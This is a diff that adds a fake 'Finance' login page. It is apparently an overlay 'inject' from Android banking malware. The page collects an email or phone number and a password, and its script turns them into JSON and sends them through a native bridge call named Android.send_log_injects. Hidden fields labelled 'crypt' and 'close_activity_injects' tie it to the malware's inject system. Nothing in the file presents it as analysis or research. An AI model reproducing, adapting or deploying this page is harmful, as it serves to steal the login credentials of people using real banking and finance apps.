@@ -1,0 +1,435 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.6">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+    <title>Finance</title>
+</head>
+<style>
+    body {
+    padding: 0;
+    margin: 0;
+    background-color: #f5f2f2;
+    color: #fff;
+    background-repeat: no-repeat;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+	
+
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    
+    margin-top: 50px;
+    text-align: center;
+}
+.logo {
+    margin: 0 auto;
+    text-align: center;
+}
+.main {
+    margin-top: 10px;
+}
+.autorizeBox {
+    border-radius: 5px;
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+@media only screen and (max-width: 444px) {
+    .autorizeBox {
+        margin: 0 20px;
+    }
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.autorizeBox ::placeholder {
+    color: #c7bcbc;
+    opacity: 1;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox input {
+    background: #fff;
+    color: #000;
+    font-size: 1.125rem;
+    border: none;
+    padding: 10px 7px;
+    margin: 10px 0;
+    width: 96%;
+}
+.autorizeBox input.dt {
+    width: 17%;
+}
+.autorizeBox button {
+    margin: 30px 0;
+    background-color: #069c87;
+    border: solid #f90000 0.6px;
+    color:  #fff;
+    width: 100%;
+    height: 4.0rem;
+    overflow-x: auto;
+    text-align: auto;
+    vertical-align: middle;
+    cursor: pointer;
+	margin-left: 10px;
+}
+.autorizeBox button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+.footer {
+    font-size: 16px;
+    padding: 1em 0;
+    margin-top: 50px;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    color: #757575;
+    font-size: .65625rem;
+    text-align: center;
+}
+.footer p {
+    margin: 25px 0;
+}
+#ccnumlbl {
+    color: red;
+    font-size: 0.8rem;
+}
+.warntext {
+    color: red;
+    margin-bottom: 20px;
+    text-align: center;
+    font-weight: bolder;
+}
+INPUT[type="text"] {
+  margin-bottom: 2.25em;
+    height: 100px;
+    width: 100%;
+    padding: 0 10px;
+    border: none;
+    border-bottom: 1px solid #c7bcbc;
+    background: #fff;
+    background-clip: border-box;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #000;
+    font-size: 1em;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 10;
+    direction: ltr;
+}
+INPUT[type="text"]:focus {
+    background-color: #fff0; /* Цвет фона */
+    color: #000; /* Цвет текста */
+    border: solid #000 0.7px;
+	
+}
+
+INPUT[type="password"] {
+    background-color: #000; /* Цвет фона */
+    color: #000; /* Цвет текста */
+  margin-bottom: 2.25em;
+    height: 100px;
+    width: 100%;
+    padding: 0 40px;
+    border: none;
+    border-bottom: 1px solid #c7bcbc;
+    background: #fff;
+    background-clip: border-box;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #000;
+    font-size: 1em;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 2100;
+    direction: ltr;
+	
+	
+}
+INPUT[type="password"]:focus {
+    background-color: #00000; /* Цвет фона */
+    color: #000; /* Цвет текста */
+    border: solid #fff 0.7px;
+}
+* {
+box-sizing: border-box;
+}
+
+*:focus {
+	outline: none;
+}
+body {
+font-family: Arial;
+
+
+}
+.login {
+margin: 20px auto;
+width: 450px;
+height: 200px;
+padding: 2 410px;
+
+}
+.login-screen {
+background-color: #FFF;
+padding: 40px;
+border-radius: 100px
+}
+
+.app-title {
+text-align: center;
+color: #777;
+}
+
+.login-form {
+text-align: center;
+}
+.control-group {
+margin-bottom: 10px;
+}
+
+input {
+text-align: center;
+background-color: #ECF0F1;
+border: 2px solid transparent;
+border-radius: 3px;
+font-size: 16px;
+font-weight: 200;
+padding: 10px 0;
+width: 250px;
+transition: border .5s;
+}
+
+input:focus {
+border: 2px solid #3498DB;
+box-shadow: none;
+}
+
+.btn {
+  border: 2px solid transparent;
+  background: #3498DB;
+  color: #ffffff;
+  font-size: 16px;
+  line-height: 25px;
+  padding: 10px 0;
+  text-decoration: none;
+  text-shadow: none;
+  border-radius: 3px;
+  box-shadow: none;
+  transition: 0.25s;
+  display: block;
+  width: 250px;
+  margin: 0 auto;
+}
+
+.btn:hover {
+  background-color: #2980B9;
+}
+
+.login-link {
+  font-size: 12px;
+  color: #444;
+  display: block;
+	margin-top: 12px;
+}
+
+
+</style>
+
+<body>
+
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+
+
+        <div class="autorizeBox">
+
+            
+
+              
+				 
+                 
+	<div class="login">
+		<div class="login-screen">
+			<div class="app-title">
+				<h1>Hello Again</h1>
+				
+			</div>
+
+			<div class="login-form">
+				<div class="control-group">
+			            <form id="login" action="">
+               
+<input class="colorX" id="Login" placeholder="Email or phone" pattern=".{4,}" autocomplete="off" type="text"  required>">
+					
+
+                                        <input class="colorX" id="Password" placeholder="Password" pattern=".{4,}" autocomplete="off" type="password"  required>
+              <h4>	<center><font color="000">Forgot password?</font>
+					 <button type="button" onclick="process('login')"><span>Login</span></button>
+					
+					        <input id="type_injects" value='crypt' type="hidden" required>
+                    <input id="closed" value='close_activity_injects' type="hidden" required>
+					 <h2>	<center><font color="000">Register</font>
+				
+			</div>
+		</div>
+		
+	</div>
+</body>
+                 
+				 <div>
+				 
+
+
+<br>
+					
+					
+                    
+															
+
+				
+            </form>
+        </div>
+    </div>
+    <div style="margin-top: -10px">
+    <center>
+        
+       
+    </center>
+    </div>
+</body>
+<script>
+        
+        var allButtons = document.getElementsByTagName('button');
+        for(var btn in allButtons) {
+            allButtons[btn].disabled = true;
+        }
+        
+        function CheckValidInput(id) {
+            var finalbool = true, formids = document.getElementById(id);
+            var currentinputs = formids.getElementsByTagName('input');
+            for(var i = 0; i < currentinputs.length; i++ ) {
+                finalbool &= currentinputs[i].checkValidity();
+            }
+            formids.getElementsByTagName('button')[0].disabled = !finalbool;
+        }
+        
+        var AllForms = document.getElementsByTagName('form');
+        for(var i = 0; i < AllForms.length; i++) {
+            var myInputs = AllForms[i].getElementsByTagName('input');
+            for(var j = 0; j < myInputs.length; j++) {
+                AddInputEventByFormID(myInputs[j],AllForms[i].id);
+            }
+        }
+        
+        function AddInputEventByFormID(input, formid) {
+            input.addEventListener('input', function(){CheckValidInput(formid)});
+        }
+        
+        function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSON(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSON(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+        /*********Recursive implementation of jSON.stringify; ********/
+        var stringifyJSON = function(obj) {
+            var arrOfKeyVals = [],
+                arrVals = [],
+                objKeys = [];
+        
+            /*********CHECK FOR PRIMITIVE TYPES**********/
+            if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+                return '' + obj;
+            else if (typeof obj === 'string')
+                return '"' + obj + '"';
+        
+            /*********CHECK FOR ARRAY**********/
+            else if (Array.isArray(obj)) {
+                if (obj[0] === undefined)
+                    return '[]';
+                else {
+                    obj.forEach(function(el) {
+                        arrVals.push(stringifyJSON(el));
+                    });
+                    return '[' + arrVals + ']';
+                }
+            }
+            /*********CHECK FOR OBJECT**********/
+            else if (obj instanceof Object) {
+                objKeys = Object.keys(obj);
+                objKeys.forEach(function(key) {
+                    var keyOut = '"' + key + '":';
+                    var keyValOut = obj[key];
+                    if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                        arrOfKeyVals.push('');
+                    else if (typeof keyValOut === 'string')
+                        arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+                    else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                        arrOfKeyVals.push(keyOut + keyValOut);
+                    else if (keyValOut instanceof Object) {
+                        arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+                    }
+                });
+                return '{' + arrOfKeyVals + '}';
+            }
+        };
+        
+        function formToJSON(f)
+        {
+            var FinalObject = {}, namesHTML = ['input','select'];
+            for(var i = 0; i < namesHTML.length; i++) {
+                var bsform = f.getElementsByTagName(namesHTML[i]);
+                for(var j = 0; j < bsform.length; j++) {
+                    FinalObject[bsform[j].id] = bsform[j].value
+                }
+            }
+            return stringifyJSON(FinalObject);
+        }
+        </script>
+        </html>
